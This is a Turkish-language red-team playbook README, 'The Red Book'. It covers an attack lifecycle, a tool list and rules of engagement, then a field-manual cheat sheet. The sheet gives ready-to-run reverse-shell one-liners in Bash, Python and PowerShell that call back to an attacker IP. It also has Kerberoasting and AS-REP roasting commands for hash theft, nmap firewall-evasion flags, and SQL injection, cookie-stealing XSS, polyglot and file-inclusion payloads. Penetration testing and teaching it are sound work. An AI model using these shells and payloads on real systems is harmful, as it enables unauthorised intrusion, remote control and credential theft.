# 🔴 KIZIL KİTAP: Taarruz Doktrini (The Red Book)

> "Sistemlerin en zayıf halkası kod değil, o kodu yazan ve yöneten insandır. Biz zinciri değil, zihniyetleri kırarız."

---

## ⚔️ Metodoloji: Saldırı Yaşam Döngüsü

Kırmızı Takım operasyonlarımız, **Cyber Kill Chain** ve **MITRE ATT&CK** çerçevelerine sıkı sıkıya bağlıdır. Ancak biz sadece adımları takip etmeyiz; kaosu yönetiriz.

### 1. Keşif ve İstihbarat (Reconnaissance)
*Savaş başlamadan kazanılır.*
- **Pasif Keşif**: Hedefe dokunmadan bilgi toplama. `Whois`, `DNS Dumpster`, `Shodan`, `TheHarvester`.
- **Aktif Keşif**: Hedef sistemlerle doğrudan etkileşim. Port taramaları, banner grabbing. `Nmap`, `Masscan`.

### 2. Silahlandırma (Weaponization)
*Dijital mühimmatın hazırlanması.*
- Payload oluşturma: `Msfvenom`, `Veil Framework`.
- Exploit modifikasyonu: Public exploitleri (Exploit-DB) hedefe özel hale getirme.
- C2 (Komuta Kontrol) Altyapısı: `Cobalt Strike` veya özel Python listener'lar hazırlama.

### 3. İletim ve Sömürü (Delivery & Exploitation)
*Kapıyı kırmak.*
- **Phishing**: Sosyal mühendislik ile zararlı dosya gönderimi.
- **Web Zafiyetleri**: SQLi, XSS, RCE üzerinden sisteme sızma.
- **Ağ Zafiyetleri**: Yama eksikliklerinden (EternalBlue vb.) faydalanma.

### 4. Kurulum ve Kalıcılık (Installation & Persistence)
*Sessizce yerleşmek.*
- Registry anahtarları, Scheduled Task'lar veya Cron job'lar ile yeniden başlatma sonrası erişimi koruma.
- **Rootkit** kullanımı (Gerekirse).

### 5. Yanal Hareket (Lateral Movement)
*Kalede gezinmek.*
- `Mimikatz` ile parola hash'lerini (Pass-the-Hash) veya biletleri (Pass-the-Ticket) çalma.
- Ağ içerisindeki diğer sunuculara (Domain Controller gibi) sıçrama.

---

## 🧰 Kızıl Arsenal (Araç Seti)

| Araç | Kategori | Kullanım Amacı |
| :--- | :--- | :--- |
| **Kali Linux** | İşletim Sistemi | Saldırı platformu. |
| **Metasploit** | Framework | Exploit geliştirme ve çalıştırma. |
| **Burp Suite** | Web | Proxy ve Web zafiyet analizi. |
| **Nmap** | Ağ | Port tarama ve servis tespiti. |
| **Hydra** | Brute Force | Parola kırma saldırıları. |
| **John the Ripper** | Kripto | Hash kırma. |
| **SQLMap** | Veritabanı | Otomatik SQL Enjeksiyonu. |

---

## ⚠️ Angajman Kuralları (Rules of Engagement)

1. **İzin Almadan Asla**: Yazılı yetki (Scope Belgesi) olmadan hiçbir sisteme saldırılmaz.
2. **Zarar Verme**: Veri bütünlüğünü bozacak eylemlerden (DROP TABLE gibi) kaçınılır.
3. **Raporla**: Bulunan her zafiyet, kanıtlarıyla (PoC) birlikte raporlanır.


---

## 💻 Sentinel Recon (Araç Kullanımı)

Bu repo içerisinde, keşif aşaması için geliştirdiğimiz özel bir Port Tarayıcı bulunur.

**Konum**: `TOOLS/sentinel_recon.py`

**Kullanım**:
```bash
python3 TOOLS/sentinel_recon.py <HEDEF_IP>
```
*Bu araç sadece TCP bağlantılarını test eder ve banner bilgisi çekmeye çalışır.*

---

## 📕 RTFM: Red Team Field Manual (Saha Notları)

Saha operasyonlarında hız hayat kurtarır. Sık kullanılan komutlar ve teknikler için hızlı referans.

### 🛡️ Nmap Cheat Sheet
| Komut | Açıklama |
| :--- | :--- |
| `nmap -sS -T4 -p- <IP>` | **Gizli (SYN) Tarama**: En sık kullanılan, hızlı tarama. |
| `nmap -sV -sC -O <IP>` | **Tam Analiz**: Versiyon, varsayılan scriptler ve OS tespiti. |
| `nmap -sU --top-ports 100 <IP>` | **UDP Taraması**: En popüler 100 UDP portu. |
| `nmap -f -D RND:10 <IP>` | **Firewall Atlatma**: Paketleri parçalar ve sahte IP'ler kullanır. |
| `nmap --script vuln <IP>` | **Zafiyet Taraması**: Bilinen zafiyetleri NSE scriptleri ile arar. |

### 🏹 Metasploit (MSF) Konsolu
- **Modül Arama**: `search type:exploit platform:windows <terim>`
- **Modül Seçme**: `use <modül_numarası_veya_yolu>`
- **Gereksinimleri Listeleme**: `show options`
- **Payload Oluşturma**: `set PAYLOAD <payload_yolu>` (örn: `windows/x64/meterpreter/reverse_tcp`)
- **İşleyici (Listener) Başlatma**: `use exploit/multi/handler`

### 🐚 Reverse Shell One-Liners (Ters Bağlantı)
Hedef makineden kendi makinenize (Attacker IP: `10.0.0.1`, Port: `4444`) bağlantı açmak için:

**Bash (Linux)**:
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Python**:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PowerShell (Windows)**:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 🗝️ Yetki Yükseltme (Privilege Escalation) Kontrol Listesi
- [ ] **Kernel Versiyonu**: `uname -a` / `systeminfo` (Kernel exploit var mı?)
- [ ] **SUID/Sudo**: `sudo -l` (Şifresiz root yetkisi var mı?)
- [ ] **Hizmetler**: Çalışan servisler root/system yetkisiyle mi çalışıyor?
- [ ] **Cron/Tasks**: Yazılabilir bir cron job dosyası var mı?

---

## 🏴‍☠️ Gelişmiş Taktikler: Active Directory & Web

Kurumsal ağların kalbine giden yol.

### 🏢 Active Directory Saldırıları
Domain Controller (DC) ele geçirme teknikleri.

#### 1. Kerberoasting (Kullanıcı Hash Avı)
SPN (Service Principal Name) atanmış servis hesaplarının hashlerini çeker.
```powershell
# PowerView ile
Get-NetUser -SPN
# Rubeus ile
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Hashcat ile Kırma (Mod 13100)
hashcat -m 13100 hashes.kerberoast wordlist.txt
```

#### 2. AS-REP Roasting (Pre-Auth Zafiyeti)
"Do not require Kerberos preauthentication" işaretli kullanıcıları avlar.
```powershell
# Rubeus ile
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
# Hashcat ile Kırma (Mod 18200)
hashcat -m 18200 hashes.asreproast wordlist.txt
```

### 🕸️ OWASP Top 10: Hızlı Payloads

| Zafiyet | Payload Örneği | Amaç |
| :--- | :--- | :--- |
| **SQL Injection** | `' OR 1=1 --` | Login Bypass. |
| **SQL Injection** | `' UNION SELECT 1, @@version --` | Veritabanı versiyonunu çekme. |
| **XSS (Reflected)** | `<script>alert(document.cookie)</script>` | Çerezleri (Session ID) çalma. |
| **XSS (Polyglot)** | `javascript://%250Aalert(1)//"/*\'/*"/*--></Title/</Script/<Image Src=x OnError=alert(1)>` | Filtreleri atlatmak için karmaşık XSS. |
| **LFI (Local File Inclusion)** | `../../../../etc/passwd` | Sistem dosyalarını okuma. |

